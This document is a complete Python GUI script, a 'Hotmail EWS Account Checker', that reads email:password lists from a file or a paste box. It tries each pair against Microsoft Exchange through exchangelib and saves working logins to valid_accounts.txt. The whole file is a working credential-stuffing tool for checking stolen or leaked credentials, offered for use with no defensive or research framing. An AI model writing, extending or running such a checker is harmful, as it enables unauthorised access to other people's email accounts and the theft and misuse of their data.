import tkinter as tk
from tkinter import filedialog, messagebox, ttk, scrolledtext
import threading
import webbrowser
from exchangelib import Credentials, Account, DELEGATE
import time

# Function to check Hotmail login via EWS
def check_hotmail_login(email, password):
    try:
        creds = Credentials(email, password)
        account = Account(email, credentials=creds, autodiscover=True, access_type=DELEGATE)

        # If we can access the inbox, login is successful
        account.inbox.all().count()
        return True  # Login successful
    except Exception as e:
        return False  # Login failed

# Function to process accounts from a file
def process_accounts(accounts):
    global success_count, failed_count

    valid_accounts = []
    failed_accounts = []
    total = len(accounts)

    for index, account in enumerate(accounts, start=1):
        if len(account) != 2:
            update_progress(f"⚠️ Skipping invalid format: {account}")
            continue

        email, password = account
        update_progress(f"🔄 Checking {index}/{total}: {email}...")

        start_time = time.time()
        success = check_hotmail_login(email, password)
        elapsed_time = time.time() - start_time

        if success:
            valid_accounts.append(f"{email}:{password}")
            success_count += 1
            update_progress(f"✅ {email} (Success) [⏳ {elapsed_time:.2f}s]")
        else:
            failed_accounts.append(f"{email}:{password}")
            failed_count += 1
            update_progress(f"❌ {email} (Failed) [⏳ {elapsed_time:.2f}s]")

        update_summary()

    # Save results
    with open("valid_accounts.txt", "w") as f:
        f.write("\n".join(valid_accounts))
    with open("failed_accounts.txt", "w") as f:
        f.write("\n".join(failed_accounts))

    update_progress(f"✅ Process Complete! {success_count} successful, {failed_count} failed.")
    messagebox.showinfo("Done", "Account checking finished!")

# Function to start processing from uploaded file
def upload_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return

    with open(file_path, "r") as f:
        accounts = [line.strip().split(":") for line in f.readlines()]

    start_processing(accounts)

# Function to start processing from pasted input
def paste_accounts():
    input_text = input_box.get("1.0", tk.END).strip()
    if not input_text:
        messagebox.showwarning("No Input", "Please enter email:password list.")
        return

    accounts = [line.strip().split(":") for line in input_text.split("\n")]
    start_processing(accounts)

# Function to handle threaded processing
def start_processing(accounts):
    global success_count, failed_count
    success_count = 0
    failed_count = 0
    progress_text.delete("1.0", tk.END)
    summary_label.config(text="✅ 0 Success | ❌ 0 Failed")
    threading.Thread(target=process_accounts, args=(accounts,), daemon=True).start()

# Function to update progress text in real time
def update_progress(message):
    progress_text.insert(tk.END, message + "\n")
    progress_text.see(tk.END)

# Function to update success/failure counts in real time
def update_summary():
    summary_label.config(text=f"✅ {success_count} Success | ❌ {failed_count} Failed")

# Function to open valid accounts file
def open_valid_accounts():
    try:
        webbrowser.open("valid_accounts.txt")  # Opens in default text editor
    except Exception as e:
        messagebox.showerror("Error", f"Could not open file: {e}")

# Create GUI
def create_gui():
    global root, progress_text, input_box, summary_label
    root = tk.Tk()
    root.title("Hotmail EWS Account Checker")
    root.geometry("600x500")

    label = tk.Label(root, text="Upload or Paste Accounts (email:password)", font=("Arial", 12))
    label.pack(pady=5)

    # Buttons
    frame = tk.Frame(root)
    frame.pack()

    upload_button = tk.Button(frame, text="📂 Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(side=tk.LEFT, padx=10)

    paste_button = tk.Button(frame, text="✂️ Paste Accounts", command=paste_accounts, font=("Arial", 10), bg="lightgreen")
    paste_button.pack(side=tk.LEFT, padx=10)

    # Text box for copy-paste input
    input_box = scrolledtext.ScrolledText(root, height=5, width=60)
    input_box.pack(pady=5)

    # Summary label
    summary_label = tk.Label(root, text="✅ 0 Success | ❌ 0 Failed", font=("Arial", 12))
    summary_label.pack(pady=5)

    # Progress output
    progress_text = scrolledtext.ScrolledText(root, height=12, width=70)
    progress_text.pack(pady=5)

    # Button to open valid accounts
    open_valid_button = tk.Button(root, text="📜 View Successful Logins", command=open_valid_accounts, font=("Arial", 10), bg="lightyellow")
    open_valid_button.pack(pady=5)

    root.mainloop()

# Start GUI
create_gui()
